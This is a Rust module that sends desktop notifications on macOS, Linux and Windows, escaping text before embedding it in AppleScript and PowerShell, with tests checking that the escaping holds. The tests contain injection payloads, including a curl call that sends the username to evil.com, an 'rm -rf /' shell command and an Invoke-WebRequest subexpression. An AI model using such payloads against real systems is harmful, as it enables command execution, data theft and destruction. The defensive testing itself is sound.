//! OS native notification support
//!
//! Platform-specific implementations for desktop notifications.
//! Uses tokio::process::Command for async compatibility.

use crate::Result;

/// Sanitize text for embedding in an AppleScript double-quoted string.
///
/// AppleScript strings use `"` as delimiter and `\` as escape character.
/// We must escape: backslash, double-quote, and strip all control characters
/// (newlines, tabs, etc.) that could break the string context or cause
/// unexpected AppleScript parsing behavior.
#[cfg(target_os = "macos")]
fn sanitize_for_applescript(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 16);
    for ch in text.chars() {
        match ch {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            // Strip control characters (newlines, tabs, null bytes, etc.)
            // that could break out of the string context
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    out
}

/// Sanitize text for embedding in a PowerShell single-quoted string.
///
/// PowerShell single-quoted strings treat everything as literal except `'`,
/// which must be doubled (`''`). This is much safer than double-quoted strings
/// where `$`, `@`, and subexpressions `$()` are interpolated.
/// Control characters are stripped to prevent parsing issues.
#[cfg(target_os = "windows")]
fn sanitize_for_powershell(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 16);
    for ch in text.chars() {
        match ch {
            '\'' => out.push_str("''"),
            // Strip control characters
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    out
}

/// Send a native OS notification
///
/// # Platform Support
/// - **macOS**: Uses osascript with AppleScript
/// - **Linux**: Uses notify-send command
/// - **Windows**: Uses PowerShell toast notifications
/// - **Other**: No-op (returns Ok silently)
///
/// # Security
/// Input is sanitized to prevent shell injection attacks.
#[cfg(target_os = "macos")]
pub async fn send_os_notification(title: &str, body: &str) -> Result<()> {
    use tokio::process::Command;

    let safe_title = sanitize_for_applescript(title);
    let safe_body = sanitize_for_applescript(body);

    let script = format!(
        "display notification \"{}\" with title \"{}\"",
        safe_body, safe_title
    );

    Command::new("osascript")
        .args(["-e", &script])
        .output()
        .await?;

    Ok(())
}

#[cfg(target_os = "linux")]
pub async fn send_os_notification(title: &str, body: &str) -> Result<()> {
    use tokio::process::Command;

    // notify-send uses arguments directly, no shell interpolation needed
    Command::new("notify-send")
        .arg(title)
        .arg(body)
        .output()
        .await?;

    Ok(())
}

#[cfg(target_os = "windows")]
pub async fn send_os_notification(title: &str, body: &str) -> Result<()> {
    use tokio::process::Command;

    let safe_title = sanitize_for_powershell(title);
    let safe_body = sanitize_for_powershell(body);

    // Use single-quoted strings in PowerShell to prevent variable/subexpression interpolation.
    // In single-quoted strings, only '' (doubled single-quote) is special.
    let ps_script = format!(
        "[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null; \
         [Windows.UI.Notifications.ToastNotification, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null; \
         $template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02); \
         $template.SelectSingleNode('//text[@id=\"1\"]').InnerText = '{}'; \
         $template.SelectSingleNode('//text[@id=\"2\"]').InnerText = '{}'; \
         $toast = [Windows.UI.Notifications.ToastNotification]::new($template); \
         [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Klyntbot').Show($toast)",
        safe_title, safe_body
    );

    Command::new("powershell")
        .args(["-Command", &ps_script])
        .output()
        .await?;

    Ok(())
}

#[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
pub async fn send_os_notification(_title: &str, _body: &str) -> Result<()> {
    // Unsupported platform - silent no-op
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── AppleScript sanitization tests ──────────────────────────────────

    #[cfg(target_os = "macos")]
    mod applescript {
        use super::*;

        #[test]
        fn plain_text_unchanged() {
            assert_eq!(sanitize_for_applescript("hello world"), "hello world");
        }

        #[test]
        fn escapes_backslash() {
            assert_eq!(sanitize_for_applescript("path\\to\\file"), "path\\\\to\\\\file");
        }

        #[test]
        fn escapes_double_quote() {
            assert_eq!(sanitize_for_applescript(r#"say "hi""#), "say \\\"hi\\\"");
        }

        #[test]
        fn strips_newlines_and_carriage_returns() {
            assert_eq!(sanitize_for_applescript("line1\nline2\rline3"), "line1line2line3");
        }

        #[test]
        fn strips_null_bytes() {
            assert_eq!(sanitize_for_applescript("before\0after"), "beforeafter");
        }

        #[test]
        fn strips_tabs() {
            assert_eq!(sanitize_for_applescript("col1\tcol2"), "col1col2");
        }

        #[test]
        fn injection_do_shell_script() {
            // Attempt to break out of string and execute shell command
            let input = r#"" & do shell script "whoami" & ""#;
            let sanitized = sanitize_for_applescript(input);
            // All double quotes must be escaped — no unescaped " to break context
            assert!(!sanitized.contains(r#"""#) || sanitized.replace("\\\"", "").find('"').is_none());
            assert!(sanitized.contains("\\\""));
        }

        #[test]
        fn injection_newline_breakout() {
            // Newlines could end the string and start new AppleScript statements
            let input = "\"\ndo shell script \"rm -rf /\"\n\"";
            let sanitized = sanitize_for_applescript(input);
            assert!(!sanitized.contains('\n'));
            assert!(!sanitized.contains('\r'));
        }

        #[test]
        fn injection_mixed_control_chars() {
            let input = "normal\x00\x01\x02\x03\x1b[31mred\x1b[0m";
            let sanitized = sanitize_for_applescript(input);
            assert_eq!(sanitized, "normal[31mred[0m");
        }

        #[test]
        fn unicode_preserved() {
            let input = "Hello 🌍 café résumé";
            assert_eq!(sanitize_for_applescript(input), input);
        }

        #[test]
        fn combined_attack_vector() {
            let input = "test\"; do shell script \"curl http://evil.com/$(whoami)\"\n--";
            let sanitized = sanitize_for_applescript(input);
            // No unescaped quotes, no newlines
            assert!(!sanitized.contains('\n'));
            // Every " in output must be preceded by \
            let clean = sanitized.replace("\\\"", "");
            assert!(!clean.contains('"'), "unescaped double-quote found: {sanitized}");
        }
    }

    // ── PowerShell sanitization tests ───────────────────────────────────

    #[cfg(target_os = "windows")]
    mod powershell {
        use super::*;

        #[test]
        fn plain_text_unchanged() {
            assert_eq!(sanitize_for_powershell("hello world"), "hello world");
        }

        #[test]
        fn escapes_single_quote_by_doubling() {
            assert_eq!(sanitize_for_powershell("it's"), "it''s");
        }

        #[test]
        fn dollar_sign_preserved() {
            // In single-quoted PS strings, $ is literal — no escaping needed
            assert_eq!(sanitize_for_powershell("$env:PATH"), "$env:PATH");
        }

        #[test]
        fn backtick_preserved() {
            // In single-quoted PS strings, backtick is literal
            assert_eq!(sanitize_for_powershell("`whoami`"), "`whoami`");
        }

        #[test]
        fn strips_control_characters() {
            assert_eq!(sanitize_for_powershell("a\nb\rc\0d"), "abcd");
        }

        #[test]
        fn injection_subexpression() {
            let input = "$(Invoke-WebRequest http://evil.com)";
            let sanitized = sanitize_for_powershell(input);
            // In a single-quoted string context, this is literal text
            assert_eq!(sanitized, "$(Invoke-WebRequest http://evil.com)");
        }

        #[test]
        fn injection_break_single_quote() {
            let input = "'; Invoke-Expression 'malicious'; '";
            let sanitized = sanitize_for_powershell(input);
            // All ' become '' — can't break out of the string
            assert_eq!(sanitized, "'''; Invoke-Expression ''malicious''; ''");
        }
    }

    // ── Platform-agnostic integration test ──────────────────────────────

    #[tokio::test]
    async fn test_send_notification_no_crash() {
        // Verifies the function doesn't panic with normal and adversarial input.
        // Actual notification may fail if platform tools aren't available.
        let _ = send_os_notification("Test", "Body").await;
        let _ = send_os_notification("", "").await;
        let _ = send_os_notification("a\nb\rc", "x\0y").await;
        let _ = send_os_notification(
            r#""; do shell script "whoami""#,
            "$PATH `id` $(uname)",
        )
        .await;
    }
}
